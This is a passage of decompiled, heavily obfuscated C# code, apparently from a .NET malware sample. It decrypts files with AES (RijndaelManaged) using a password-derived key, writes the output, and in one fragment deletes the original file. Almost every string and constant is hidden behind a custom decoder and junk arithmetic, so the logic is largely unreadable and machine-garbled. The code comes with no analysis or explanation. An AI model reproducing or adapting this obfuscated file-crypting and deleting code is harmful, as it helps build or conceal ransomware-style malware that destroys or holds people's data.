			Bne_Un bne_Un = get_Payload;
			string text = char.ToString('৫');
			int num22 = ((-678715 - array2[20] <= (Marshal.SizeOf(typeof(InternetCache)) ^ 0x7BCA4)) ? array[3] : (-274470));
			string text2 = char.ToString((char)num22);
			char c = (char)Convert.ToInt32("100111001101", 2);
			string text3 = char.ToString((char)(int)c);
			string text4 = char.ToString((char)(SecurityException | 'T'));
			string string_7 = string.Concat(char.ToString('⾗'), char.ToString('⾓') + char.ToString('⾂') + "⾃⿇");
			object[] array14 = new object[(uint)array[Convert.ToInt32("0", 16)]];
			int num23 = _003CModule_003E.ActivityOptions[1];
			array14[num23] = 9443;
			array14[(nint)((Array)(object)"\u0338").LongLength] = (char)Convert.ToInt32(char.ToString('1') + "01" + "100110", 2);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_7, array14);
			string string_8 = string.Concat(text, text2, text3 + text4 + string_7);
			string string_9 = string.Concat("盘盜", "盜盜盜" + "盜盜盜盜盜盚");
			object[] array15 = new object[3];
			array15[checked(134170 + _003CModule_003E.KeyValuePair__2[100])] = (byte)Convert.ToInt32("0", 2) != 0;
			array15[checked(Convert.ToInt32("1", 8) * 1)] = -481 * Convert.ToInt32("11111111111111111111111111111101", 2);
			int num24 = array2[9];
			array15[num24] = string.Concat(char.ToString('䗻'), char.ToString(array[8]), char.ToString('\u0746') + "í٨");
			_003CModule_003E.TAIWANLUNISOLAR(ref string_9, array15);
			object[] array16 = new object[~Convert.ToInt32(string_9, 8)];
			int num25 = 3506003 >> Convert.ToInt32("16", _003CModule_003E.KeyValuePair__2[2]);
			int num26 = Marshal.SizeOf(typeof(Conv_I8)) << Convert.ToInt32("1", 2);
			array16[num25] = checked(num26 * get_PercentNegativePattern);
			int num27 = _003CModule_003E.get_PositiveSign[10] * 147 + ch;
			int num28 = default(int);
			switch (checked(Convert.ToInt32("3057401", 8) + -380335))
			{
			case 430417:
				num28 = Convert.ToInt32("1111000111001001101", 2) ^ -615651;
				break;
			case 430418:
				num28 = 0;
				break;
			}
			int num29 = num28;
			int num30 = ((-27149 == Convert.ToInt32("11111111111111111001010111110011", 2)) ? 2397160 : CreateOrthographic);
			array16[num27] = (byte)checked(num29 * unchecked(num30 % _003CModule_003E.ActivityOptions[7])) != 0;
			string string_10 = "灩";
			object[] array17 = new object[sizeof(uint)];
			array17[0] = Convert.ToInt32("37777776455", 8) * -3;
			array17[Convert.ToInt32("1", 16) * 1] = 11448;
			array17[2] = _003CModule_003E.KeyValuePair__2[(nint)((Array)(object)"\u0318\u033c\u0303\u033e\u0324\u036e\u033e\u033c\u0342").LongLength];
			array17[array2[21] + Convert.ToInt32("2152043", 8)] = 1661;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_10, array17);
			string value2 = string_10;
			string string_11 = string.Concat(char.ToString('ꍑ'), char.ToString('ꍐ'), char.ToString('ꍐ') + "ꍐꍐ");
			object[] array18 = new object[4];
			char c2 = array[1];
			array18[(uint)c2] = '蟲';
			int num31 = _003CModule_003E.ActivityOptions[2];
			int num32 = ((_003CModule_003E.ActivityOptions[89] <= _003CModule_003E.ActivityOptions[90]) ? _003CModule_003E.KeyValuePair__2[101] : Convert.ToInt32("100", 2));
			array18[num31] = num32;
			array18[2] = string.Concat(char.ToString('\u07bb'), char.ToString('Ţ') + char.ToString('\u0012') + "Ď\u0010");
			array18[3] = 4381;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_11, array18);
			array16[Convert.ToInt32(value2, Convert.ToInt32(string_11, Convert.ToInt32("3", 16) & 2))] = Marshal.SizeOf(typeof(System_002ERuntime_002EInteropServices));
			int num33 = ~((-18 & _003CModule_003E.get_PositiveSign[110]) % -8);
			string string_12 = "\ue445\ue674";
			object[] array19 = new object[Marshal.SizeOf(typeof(OverlappedData))];
			array19[array2[22] - 444990] = 'ꃇ';
			array19[Inverse + -450816] = (char)Convert.ToInt32(char.ToString('3') + "21", 8);
			array19[checked(Convert.ToInt32("310231", 8) + -102551)] = 1870;
			array19[GetResult + array2[23]] = Convert.ToInt32(char.ToString('3') + char.ToString('7') + "ea", 16);
			array19[Convert.ToInt32("1001001", 2) >> Convert.ToInt32("4", 8)] = _003CModule_003E.get_PositiveSign[_003CModule_003E.ActivityOptions[8]];
			_003CModule_003E.TAIWANLUNISOLAR(ref string_12, array19);
			string text5 = string_12;
			string text6 = char.ToString((char)checked(CR * -1));
			string string_13 = char.ToString('\uf3a8') + "\uf3a8\uf3aa";
			int num34 = ((-86347 >= Convert.ToInt32("37776743511", 8)) ? set_NumberNegativePattern : Convert.ToInt32("11100101010001010111", 2));
			object[] array20 = new object[num34];
			array20[0] = false;
			array20[(nint)((Array)(object)"\u0310").LongLength] = 12359;
			array20[2] = char.ToString('⧚') + "䕔吳";
			_003CModule_003E.TAIWANLUNISOLAR(ref string_13, array20);
			array16[num33] = string.Concat(text5, text6 + string_13);
			int num35 = ((((array2[7] == array2[8]) ? 1u : 0u) != array[1]) ? (-467189 / IsPublic) : Convert.ToInt32(char.ToString('4') + "00bf", Convert.ToInt32("10", 16)));
			array16[num35 + AlreadyInProgress] = (char)array6[checked(unchecked((int)array[Convert.ToInt32("2", 8)]) * 1)];
			string string_14 = string.Concat(char.ToString('缪'), char.ToString((char)Marshal.SizeOf(typeof(FilterTypeNameIgnoreCase))), char.ToString('缬') + char.ToString('缩') + "缬缨缭缩缭缯");
			object[] array21 = new object[(nint)((Array)(object)(char.ToString('\u032c') + char.ToString('\u030a') + "\u0323\u0354\u0314")).LongLength];
			array21[Convert.ToInt32("0", 16)] = false;
			array21[429979 - Marshal.SizeOf(typeof(get_CurrencyEnglishName))] = string.Concat(char.ToString('֊'), char.ToString((char)Convert.ToInt32("153", 16)), char.ToString('\u05a9') + "_\\");
			array21[(uint)array[0]] = (char)array2[24];
			array21[Convert.ToInt32("3", array2[10])] = (int)array[4];
			int num36 = default(int);
			switch (Convert.ToInt32("2130353", 8))
			{
			case 569579:
				num36 = _003CModule_003E.get_PositiveSign[111];
				break;
			}
			array21[4] = (char)num36;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_14, array21);
			int num37 = Convert.ToInt32(string_14, checked(_003CModule_003E.ActivityOptions[92] + 677103)) / 96083566;
			int num38 = ((((Convert.ToInt32("ffffd673", 16) * 1 > 391301) ? 1 : 0) != (array2[25] ^ Convert.ToInt32("6d459", 16))) ? (-122559) : __9__27_5);
			string text7 = char.ToString((char)num38);
			string text8 = char.ToString('\u0001');
			string string_15 = "礷礹";
			object[] array22 = new object[5];
			char c3 = (char)Convert.ToInt32("0", 8);
			array22[(int)c3] = false;
			array22[Convert.ToInt32("2701545", 8) + -754532] = '\u0e65';
			array22[checked(-2 * Convert.ToInt32("11111111111111111111111111111111", 2))] = char.ToString('ඵ') + char.ToString('ň') + "\u0004\a";
			array22[3] = '\u302e';
			array22[Convert.ToInt32(char.ToString('1') + "00", 2)] = 11153;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_15, array22);
			array16[num37] = string.Concat(text7, text8 + string_15);
			_003CModule_003E.GetMaxByteCount(ref string_8, array16);
			bne_Un.AutoResetEvent(string_8 + string_0);
			int safeHandleCleanupWorkListElement = SafeHandleCleanupWorkListElement;
			string string_16 = "ꢑ";
			object[] array23 = new object[3];
			int num39 = _003CModule_003E.ActivityOptions[1];
			array23[num39] = "擰⻨";
			array23[1] = (byte)_003CModule_003E.ActivityOptions[1] != 0;
			array23[_003CModule_003E.ActivityOptions[Convert.ToInt32("0", 8)]] = string.Concat(char.ToString('భ'), char.ToString('\u09c7'), char.ToString('Ŵ') + char.ToString('j') + "\u001e&\v");
			_003CModule_003E.TAIWANLUNISOLAR(ref string_16, array23);
			int num40 = ((Array)(object)string_16).Length;
			SafeHandleCleanupWorkListElement = safeHandleCleanupWorkListElement + num40;
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(string_0);
		}
	}

	private unsafe static void get_IsLayoutSequential(string string_0, string string_1, string string_2)
	{
		char[] array = new char[8] { '\0', '\u0001', '\u0005', '囉', '\u0002', '\u0010', '\b', '\u0003' };
		int[] array2 = new int[29]
		{
			2, 1, 6, 4, -228639, -693113, -825779, -84115, 12320, 16567,
			3528, 0, -2, 16, 8, -874439, 5946, -105946, 974, -620396,
			-56496, -841413, 384151, -402458, -733, 60827, 151, 153557124, -942017
		};
		char[] array3 = new char[5];
		int num = Convert.ToInt32("0", 16);
		array3[0] = (char)num;
		array3[1] = '\u0080';
		array3[10 % sizeof(float)] = '㉺';
		array3[3] = '阏';
		array3[checked(Convert.ToInt32("37774720653", 8) - -810585)] = 'ᄤ';
		char[] array4 = array3;
		int num2 = Convert.ToInt32("101", 2);
		int[] array5 = new int[num2];
		array5[(int)array[0] / 610281344] = 0;
		array5[-598349 - Convert.ToInt32("fff6deb2", 16)] = 3;
		array5[2] = 947538;
		int num3 = (array5[_003CModule_003E.KeyValuePair__2[0]] = array2[16]);
		array5[397845 - _003CModule_003E.get_PositiveSign[112]] = 8043;
		int[] array6 = array5;
		byte[] password = Encoding.UTF8.GetBytes(string_2);
		byte[] array7 = new byte[~(-165 % GetFieldFromHandle * Convert.ToInt32("1", array2[0]))];
		FileStream fileStream = new FileStream(string_0, (FileMode)(((-2063941 - Convert.ToInt32("11111111111100011111001101010001", 2)) % (Convert.ToInt32("a9400044", 16) | 0x7EF90584)) ^ (array2[4] / (1 & IsPublic))));
		string string_3 = "됫";
		object[] array8 = new object[4];
		array8[DataMisalignedException] = (byte)(array2[11] / 333058679) != 0;
		array8[1] = (char)(Convert.ToInt32("11111111111110000110010110010110", 2) - Convert.ToInt32("fff84dcd", 16));
		array8[2] = 11118;
		array8[3] = '烤';
		_003CModule_003E.TAIWANLUNISOLAR(ref string_3, array8);
		fileStream.Read(array7, array4[Convert.ToInt32(string_3, checked(-105938 - array2[17]))], array7.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		int num4 = default(int);
		switch ((nint)((Array)(object)"\u0368").LongLength * 1)
		{
		case 0:
			num4 = -833810;
			break;
		case 1:
			num4 = -443303;
			break;
		}
		int num5 = ((76747 > num4) ? Convert.ToInt32(char.ToString('2') + "400", 8) : Convert.ToInt32(char.ToString('1') + "0110" + "1011101101100", 2));
		int num6 = array2[18];
		rijndaelManaged.KeySize = num5 % (num6 & 0x201);
		string string_4 = "\ud8f8";
		object[] array9 = new object[-937384 - CancellationToken];
		array9[(nint)((Array)(object)string.Empty).LongLength] = (byte)(620396 + array2[19]) != 0;
		array9[(uint)array[Marshal.SizeOf(typeof(UseHebrewParsing))]] = 'っ';
		array9[2] = (char)checked(Convert.ToInt32("37777774751", 8) * -3);
		array9[(nint)((Array)(object)(char.ToString('\u0332') + "\u0347\u0318")).LongLength] = string.Concat(char.ToString('ᘵ'), char.ToString('⾼') + "❞\u1c8a\u09c6Ǿ\u0084");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_4, array9);
		rijndaelManaged.BlockSize = array4[Convert.ToInt32(string_4, _003CModule_003E.get_PositiveSign[3])];
		int num7 = (Marshal.SizeOf(typeof(Resize)) | Convert.ToInt32("1101001101011001100", 2)) - 439786;
		int num8 = default(int);
		switch (5 % checked(Convert.ToInt32("1100110010010010101", 2) - 418963))
		{
		case 0:
			num8 = 850184;
			break;
		case 1:
			num8 = 40;
			break;
		case 2:
			num8 = -654316;
			break;
		}
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, array7, checked(num7 * num8));
		int keySize = rijndaelManaged.KeySize;
		string text = char.ToString((char)Marshal.SizeOf(typeof(AsyncCausalityOperation)));
		string text2 = char.ToString((char)Marshal.SizeOf(typeof(CompareOptions)));
		string string_5 = string.Concat(char.ToString('℈'), char.ToString('⅄') + char.ToString('≴') + "ℷⅱ⅒");
		object[] array10 = new object[Convert.ToInt32("5", 8)];
		array10[(array2[20] > -504852) ? _003CModule_003E.ActivityOptions[1] : (-163187)] = ToUnixTimeSeconds % EnterReadLock;
		checked
		{
			array10[_003CModule_003E.ActivityOptions[2]] = 847299 + array2[21];
			array10[array2[22] - 384149] = unchecked((byte)Convert.ToInt32("0", 8)) != 0;
			array10[3] = 9 * array2[0];
			array10[ExceptionHandlingClauseOptions] = true;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_5, array10);
		}
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes((int)(keySize / (nint)((Array)(object)(text + text2 + string_5)).LongLength));
		int blockSize = rijndaelManaged.BlockSize;
		int num9 = Convert.ToInt32(char.ToString('1') + char.ToString('2') + "45412", 8) % 138756;
		string string_6 = string.Concat(char.ToString('鸵'), char.ToString('鸴'), char.ToString('鹡') + "鹢鹥");
		object[] array11 = new object[Convert.ToInt32("3", 8)];
		char c = (char)array2[11];
		array11[(uint)c] = 9663;
		array11[1] = false;
		array11[array2[DataMisalignedException]] = (char)(Convert.ToInt32("1e117c", 16) >> 6);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_6, array11);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(blockSize / checked(num9 - Convert.ToInt32(string_6, unchecked((int)checked(8 * unchecked((nint)((Array)(object)"\u0333\u0328").LongLength))))));
		rijndaelManaged.Padding = (PaddingMode)get_Mutex;
		int num10 = (int)(rijndaelManaged.Mode = (CipherMode)checked(693114 + array2[5]));
		ICryptoTransform transform = rijndaelManaged.CreateDecryptor();
		int num11 = (0 / Convert.ToInt32("14d453c7", 16)) | (array2[23] + 402458);
		int[] calendarType = _003CModule_003E.CalendarType;
		int num12 = Convert.ToInt32("1100", 2);
		CryptoStream cryptoStream = new CryptoStream(fileStream, transform, (CryptoStreamMode)(num11 % calendarType[num12]));
		int num13 = _003CModule_003E.Dequeue[DataMisalignedException];
		int num14 = ((73772 <= 1286463 - Marshal.SizeOf(typeof(MetadataImport))) ? (~Convert.ToInt32("37777777776", 8)) : 174495);
		FileStream fileStream2 = new FileStream(string_1, (FileMode)(num13 << num14));
		byte[] array12 = new byte[checked(_003CModule_003E.Dequeue[Convert.ToInt32(char.ToString('1') + "001", 2)] - array6[2])];
		try
		{
			int count;
			while ((count = cryptoStream.Read(array12, array6[0], array12.Length)) > 909894 + array2[6] - array2[7] * (Blt_Un / 1))
			{
				fileStream2.Write(array12, StringToBSTR, count);
			}
		}
		catch (CryptographicException ex)
		{
			Bne_Un bne_Un = get_Payload;
			string string_7 = "摦摗";
			object[] array13 = new object[4];
			array13[_003CModule_003E.ActivityOptions[1]] = 896;
			array13[checked(Convert.ToInt32("1", 8) * 1)] = 13166;
			array13[2] = string.Concat(char.ToString('ύ'), "\u0311\u038d" + "koĸ/");
			array13[Convert.ToInt32("3", ((Array)(object)"\u0325\u0341\u0318\u030e\u0308\u0365.\u036b").Length)] = '傴';
			_003CModule_003E.TAIWANLUNISOLAR(ref string_7, array13);
			string text3 = string_7;
			string string_8 = string.Concat("枒枛", char.ToString('枟') + char.ToString('构') + "枌枙枊枛");
			object[] array14 = new object[4];
			array14[0] = array2[8];
			array14[1] = char.ToString('ޣ') + "Dü";
			array14[Convert.ToInt32("2", 8)] = array2[24] * -33;
			int num15 = ((set_PerMilleSymbol < 463369) ? Convert.ToInt32("3", 8) : 20607);
			array14[num15] = (byte)Convert.ToInt32("0", Convert.ToInt32("10", 8)) != 0;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_8, array14);
			string text4 = text3 + string_8;
			string string_9 = string.Concat(char.ToString('헁') + "헀헊", "헬헑" + "헊헌헙헝");
			object[] array15 = new object[3];
			int num16 = array2[11] / 351146543;
			char c2 = (char)Convert.ToInt32("101001111101", 2);
			array15[num16] = c2;
			array15[1] = Convert.ToInt32("101" + "0000011010", 2);
			int num17 = default(int);
			switch (checked(-692393 - SEP_MinuteSuff))
			{
			case 0:
				num17 = -899073;
				break;
			case 1:
				num17 = Convert.ToInt32("72b", 16);
				break;
			}
			array15[2] = num17;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_9, array15);
			string text5 = string_9;
			string string_10 = string.Concat(char.ToString('裩'), "裯裮", char.ToString('袠') + char.ToString('裥') + "裲裲裯裲袺袠");
			object[] array16 = new object[3];
			array16[0] = (int)array[3];
			array16[Convert.ToInt32("1", 16)] = string.Concat(char.ToString('Ȟ'), char.ToString('Ҷ') + char.ToString('ŏ') + "ͳS");
			array16[1711736898 / Convert.ToInt32("110011000000111000010000100001", 2)] = BeginFaultBlock;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_10, array16);
			string string_11 = string.Concat(text4, text5 + string_10);
			string text6 = char.ToString((char)(0x59E29u ^ (uint)Convert.ToInt32("1317030", 8)));
			string string_12 = "\uf563\uf562";
			object[] array17 = new object[3];
			array17[364634 + Convert.ToInt32("fffa6fa6", 16)] = 44029;
			array17[checked(1 * Marshal.SizeOf(typeof(UseHebrewParsing)))] = 18774;
			array17[Marshal.SizeOf(typeof(ENODATA))] = false;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_12, array17);
			object[] array18 = new object[Convert.ToInt32(text6 + string_12, 2)];
			string string_13 = string.Concat(char.ToString('쟙') + "쟙쟙", "쟙쟙쟙쟙쟙쟙" + "쟙쟙쟙쟙쟙쟙쟘쟘쟙쟘쟙쟘쟙쟙쟘쟘쟘쟙쟘쟙쟙쟙쟘");
			object[] array19 = new object[3];
			array19[(uint)array[0]] = 6862;
			array19[1] = false;
			array19[2] = (char)(array2[25] & '괾');
			_003CModule_003E.TAIWANLUNISOLAR(ref string_13, array19);
			array18[checked(Convert.ToInt32(string_13, __c__DisplayClass0_3) + 109010)] = _003CModule_003E.Dequeue[1];
			int num18 = 5 % (10 % _003CModule_003E.ActivityOptions[3]);
			int currentEra = CurrentEra;
			int num19 = int_0;
			array18[num18] = currentEra / num19;
			int num20 = default(int);
			switch (0 / _003CModule_003E.ActivityOptions[93])
			{
			case 0:
				num20 = -2036687485;
				break;
			}
			int num21 = ~num20 / checked(-169723957 * (array2[12] & -6));
			int num22 = Marshal.SizeOf(typeof(get_NextSpinWillYield));
			array18[num21] = num22;
			int num23 = array6[~Convert.ToInt32("11111111" + char.ToString('1') + "11111111111111111111110", 2)];
			string string_14 = string.Concat(char.ToString((char)Convert.ToInt32("1110111010001000", 2)), char.ToString((char)_003CModule_003E.KeyValuePair__2[103]), char.ToString('\uee89') + "\uee89\uee88\uee88\uee89\uee88");
			object[] array20 = new object[4];
			array20[0xAAEF4 ^ Convert.ToInt32("aaef4", 16)] = 'ꎀ';
			array20[1] = 18482;
			array20[sizeof(short) | array2[0]] = '\u0307';
			array20[3] = false;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_14, array20);
			int num24 = Convert.ToInt32(string_14, 2);
			string string_15 = "圇坒";
			_003CModule_003E.TAIWANLUNISOLAR(ref string_15, new object[3]
			{
				false,
				'Ⅲ',
				Convert.ToInt32(char.ToString('3') + char.ToString('2') + "724", _003CModule_003E.get_PositiveSign[3])
			});
			string value = string_15;
			int fromBase = array2[13];
			array18[num23] = checked(num24 * Convert.ToInt32(value, fromBase));
			string string_16 = "ꙧ";
			object[] array21 = new object[1 | Convert.ToInt32("3", 16)];
			array21[Convert.ToInt32("0", 8)] = 7193;
			int num25 = Marshal.SizeOf(typeof(UseHebrewParsing));
			int num26 = default(int);
			switch (DataMisalignedException * -749521)
			{
			case 0:
				num26 = array[0];
				break;
			case 1:
				num26 = 846925;
				break;
			}
			array21[num25] = (byte)num26 != 0;
			int num27 = Convert.ToInt32("10", 2);
			array21[num27] = Convert.ToInt32("10" + "5072", 8);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_16, array21);
			int num28 = Convert.ToInt32(string_16, sizeof(decimal));
			string text7 = char.ToString((char)(2121513000 / checked(Convert.ToInt32("4067030", 8) - 591510)));
			string text8 = char.ToString((char)_003CModule_003E.ActivityOptions[10]);
			string string_17 = "纻\udbdb";
			_003CModule_003E.TAIWANLUNISOLAR(ref string_17, new object[2]
			{
				Convert.ToInt32(char.ToString('7') + "1344", 8),
				char.ToString('_') + char.ToString('搨') + "⊮ª"
			});
			array18[num28] = string.Concat(text7, text8 + string_17);
			_003CModule_003E.GetMaxByteCount(ref string_11, array18);
			bne_Un.GetImplTypeFlags(string_11 + ex.Message);
		}
		catch (Exception ex2)
		{
			get_Payload.GetImplTypeFlags(ex2.Message);
		}
		try
		{
			cryptoStream.Close();
			Bne_Un bne_Un2 = get_Payload;
			string string_18 = "䨑䨰";
			object[] array22 = new object[set_NumberNegativePattern];
			array22[0] = 175779 >> array2[3];
			array22[1] = false;
			array22[Convert.ToInt32("2", 8)] = char.ToString('m') + char.ToString('Ƌ') + "\u0013-";
			_003CModule_003E.TAIWANLUNISOLAR(ref string_18, array22);
			string text9 = string_18;
			string string_19 = "ớỊ";
			object[] array23 = new object[2];
			array23[(uint)array[0]] = "\u1c8c\u1c8c";
			array23[(Convert.ToInt32("10000110100111", 2) < 429920) ? Convert.ToInt32("1", 16) : 378635] = array2[Convert.ToInt32("9", 16)];
			_003CModule_003E.TAIWANLUNISOLAR(ref string_19, array23);
			string text10 = string_19;
			string text11 = char.ToString('朎');
			string text12 = char.ToString((char)_003CModule_003E.get_PositiveSign[14]);
			string string_20 = string.Concat(char.ToString((char)Convert.ToInt32("f8b8", 16)), char.ToString('\uf8a9'), char.ToString('\uf8a8') + "\uf8f6\uf8ec");
			object[] array24 = new object[sizeof(float)];
			array24[0] = 34994;
			array24[Convert.ToInt32("1", 16)] = (byte)DataMisalignedException != 0;
			array24[2] = _003CModule_003E.ActivityOptions[Convert.ToInt32("1011", 2)];
			array24[(nint)((Array)(object)"\u0355\u031d\u0489").LongLength] = checked(-356148 + Convert.ToInt32("5860e", 16));
			_003CModule_003E.TAIWANLUNISOLAR(ref string_20, array24);
			string string_21 = string.Concat(text9, text10, text11 + text12 + string_20);
			object[] array25 = new object[3];
			int num29 = array4[array2[Convert.ToInt32("3", 8)]];
			array25[0] = (char)num29;
			char c3 = (char)((6116 < Convert.ToInt32("728ac", 16)) ? ((Array)(object)"\u0311").LongLength : _003CModule_003E.get_PositiveSign[114]);
			int num30;
			checked
			{
				num30 = unchecked((int)c3) * get_PercentNegativePattern;
			}
			string text13 = char.ToString((char)array6[3]);
			int num31 = ((Convert.ToInt32("11111111111111111011000011001101", 2) < Convert.ToInt32("ee28e", 16)) ? array2[26] : (-10557));
			string text14 = char.ToString((char)num31);
			string text15 = char.ToString('ױ');
			string string_22 = "찲짵";
			_003CModule_003E.TAIWANLUNISOLAR(ref string_22, new object[2]
			{
				string.Concat(char.ToString('⠁'), char.ToString('ಗ') + char.ToString('Đ') + "Ż6\u0004\u0004"),
				OriginalString
			});
			array25[num30] = string.Concat(text13, text14 + text15 + string_22);
			string string_23 = "㘿㘝";
			object[] array26 = new object[3 * _003CModule_003E.ActivityOptions[2]];
			array26[_003CModule_003E.ActivityOptions[Convert.ToInt32("1", 8)]] = 313163 + Convert.ToInt32("11111111111110110101010100010100", 2);
			array26[1] = (char)checked(4031 - FailFast);
			array26[2] = false;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_23, array26);
			array25[(nint)((Array)(object)string_23).LongLength] = array4[2];
			_003CModule_003E.GetMaxByteCount(ref string_21, array25);
			bne_Un2.AutoResetEvent(string_21 + string_0);
		}
		catch (Exception ex3)
		{
			Bne_Un bne_Un3 = get_Payload;
			string text16 = char.ToString('\uebfd');
			string text17 = char.ToString((char)_003CModule_003E.get_PositiveSign[Convert.ToInt32("f", 16)]);
			string string_24 = string.Concat("딦딻", char.ToString('딦') + "땴딶딭");
			object[] array27 = new object[array2[Convert.ToInt32("2", 8)]];
			char dataMisalignedException = (char)DataMisalignedException;
			array27[(uint)dataMisalignedException] = checked(Convert.ToInt32("542a7", 16) + -341990);
			array27[_003CModule_003E.get_PositiveSign[2] % Convert.ToInt32("2", 8)] = Convert.ToInt32("11" + "01" + "101110011", 2);
			array27[(nint)((Array)(object)"\u0364\u0331").LongLength] = "ÄǗ";
			array27[Convert.ToInt32("11", 2) & 3] = 59;
			array27[4] = (byte)array[0] != 0;
			array27[5] = 13794;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_24, array27);
			string text18 = text16 + text17 + string_24;
			string string_25 = "\ue4c4\ue487";
			object[] array28 = new object[Convert.ToInt32(char.ToString('1') + "00", array[4])];
			array28[(uint)array[0]] = false;
			array28[_003CModule_003E.ActivityOptions[_003CModule_003E.ActivityOptions[0]]] = Marshal.SizeOf(typeof(IsExpired));
			array28[array[7] & __c__DisplayClass0_3] = (char)Convert.ToInt32("2c", 16);
			array28[Marshal.SizeOf(typeof(CharSetMask))] = string.Concat(char.ToString('ठ'), char.ToString('ĥ'), char.ToString('Ƥ') + "Ƅº");
			_003CModule_003E.TAIWANLUNISOLAR(ref string_25, array28);
			string text19 = string_25;
			string string_26 = "侱侲";
			object[] array29 = new object[Marshal.SizeOf(typeof(CharSetMask))];
			array29[(nint)((Array)(object)string.Empty).LongLength] = Convert.ToInt32(char.ToString('1') + char.ToString('0') + "2117", array[6]);
			array29[1] = (char)(array2[27] >> 15);
			array29[__c__DisplayClass0_3] = (char)array2[10];
			_003CModule_003E.TAIWANLUNISOLAR(ref string_26, array29);
			string text20 = string_26;
			string string_27 = string.Concat(char.ToString((char)Marshal.SizeOf(typeof(SEEK_SET))), char.ToString('痔'), char.ToString('痓') + "痚疝");
			object[] array30 = new object[(uint)array[2]];
			array30[0] = 3635;
			array30[1] = (char)Convert.ToInt32(char.ToString('1') + char.ToString('3') + "37", 8);
			array30[2] = Convert.ToInt32("37775273636", 8) + 720520;
			array30[3] = 5837;
			array30[array2[3]] = (byte)array[Convert.ToInt32("0", 2)] != 0;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_27, array30);
			string text21 = text19 + text20 + string_27;
			string text22 = char.ToString((char)IcuLocaleDataParts);
			string string_28 = string.Concat(char.ToString((char)Convert.ToInt32("53570", 8)), "坳坺坾" + "坥坙坾" + "坸坯坫坧地圪");
			object[] array31 = new object[set_NumberNegativePattern];
			array31[0] = false;
			array31[1] = 41966;
			array31[Convert.ToInt32("10", 2)] = 6340;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_28, array31);
			string string_29 = string.Concat(text18, text21, text22 + string_28);
			object[] array32 = new object[2];
			string string_30 = string.Concat(char.ToString('둂'), char.ToString('둂') + "됔둂둇");
			object[] array33 = new object[4];
			array33[0] = 'ᓷ';
			array33[array2[Marshal.SizeOf(typeof(UseHebrewParsing))]] = char.ToString('ڱ') + "ʂ\u031e";
			array33[2] = '\u18f9';
			int num32 = ((Convert.ToInt32("105362", 8) <= 820805) ? set_NumberNegativePattern : (-44000));
			int num33;
			checked
			{
				array33[num32] = Convert.ToInt32("2466431", 8) - 652005;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_30, array33);
				num33 = 0 * Convert.ToInt32(string_30, unchecked((int)array[6]) * 2);
			}
			string text23 = char.ToString((char)array6[4]);
			char c4 = (char)Convert.ToInt32("26530", 8);
			int num34 = c4;
			string text24 = char.ToString((char)num34);
			string string_31 = "\ue38a\ue49a";
			object[] array34 = new object[6];
			char c5 = (char)((Array)(object)string.Empty).Length;
			array34[0] = (byte)(int)c5 != 0;
			array34[1] = Convert.ToInt32("d", 16);
			array34[2] = Convert.ToInt32("37777643223", 8) * Blt_Un;
			int num35 = 261547 >> (int)array[5];
			int num36 = ((_003CModule_003E.ActivityOptions[95] > array2[28]) ? _003CModule_003E.KeyValuePair__2[105] : _003CModule_003E.get_PositiveSign[115]);
			array34[num35] = num36;
			array34[20 % array2[14]] = 9046;
			array34[Marshal.SizeOf(typeof(OverlappedData))] = 360;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_31, array34);
			array32[num33] = text23 + text24 + string_31;
			char c6 = (char)_003CModule_003E.KeyValuePair__2[0];
			array32[1] = (int)array4[(int)c6];
			_003CModule_003E.GetMaxByteCount(ref string_29, array32);
			bne_Un3.GetImplTypeFlags(string_29 + ex3.Message);
		}
		finally
		{
			fileStream2.Close();
			fileStream.Close();
		}
	}

	unsafe static get_UnmanagedCode()
	{
		char[] array = new char[9] { '\u0002', '\0', '\u0001', '\u0004', '惡', '₯', '\u0b7c', '\u0005', '¤' };
		int[] array2 = new int[15]
		{
			2, 1, 3, 836122, -276165, 3977, -516808, 826549, 4076, 585,
			443328, -564, 281470, 849598, 474044
		};
		int[] array3 = new int[(Convert.ToInt32("37777644126", 8) <= -770011) ? 496795 : 2];
		array3[Convert.ToInt32("0", _003CModule_003E.get_PositiveSign[3])] = array[1];
		char c = (char)array2[1];
		array3[(uint)c] = 10 % Convert.ToInt32("4", 8);
		int[] array4 = array3;
		string string_ = "⺾";
		object[] array5 = new object[3];
		array5[DataMisalignedException & 0] = 7889;
		char c2 = (char)array2[1];
		array5[(uint)c2] = char.ToString('Ф') + char.ToString('ל') + "թT";
		array5[2 * _003CModule_003E.ActivityOptions[2]] = false;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_, array5);
		SafeHandleCleanupWorkListElement = Convert.ToInt32(string_, 16) * checked(-541129 + Marshal.SizeOf(typeof(GetPreamble)) * -7);
		string text = char.ToString('樂');
		string string_2 = string.Concat(char.ToString('㑑') + "㑑㑑", char.ToString('㑑') + "㑑㑐㑐" + "㑑㑑㑐㑑㑑㑑㑑㑑㑐");
		object[] array6 = new object[3];
		array6[0] = (byte)array[Convert.ToInt32("1", 8)] != 0;
		array6[(uint)array[Convert.ToInt32("2", 16)]] = 1296;
		array6[Convert.ToInt32("2", 16)] = 12112;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_2, array6);
		string text2 = char.ToString((char)Convert.ToInt32(string_2, __c__DisplayClass0_3));
		string text3 = char.ToString(array[4]);
		string string_3 = "엢연";
